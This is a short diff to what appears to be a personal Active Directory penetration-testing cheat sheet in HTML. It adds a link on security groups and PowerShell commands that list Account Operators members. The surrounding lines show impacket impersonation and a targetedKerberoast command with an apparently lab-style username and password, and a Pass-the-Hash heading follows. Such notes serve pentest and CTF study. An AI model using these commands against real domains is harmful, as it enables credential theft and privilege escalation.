@@ -956,6 +956,14 @@ impacket-getST -spn cifs/target.domain -impersonate Administrator domain.htb/use
 # targetedKerberoast
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 python3 targetedKerberoast.py -v -d 'laser.com' -u 'yulia.weber' -p 'Yulia@Laser777'
+
+# Security groups
+https://www.thehacker.recipes/ad/movement/builtins/security-groups
+
+Get-Module -ListAvailable -Name ActiveDirectory
+Import-Module ActiveDirectory
+Get-ADGroupMember -Identity "Account Operators" -Recursive
+
   </code></pre>
 
   <h3 id="pth">Pass-the-Hash (PtH)</h3>
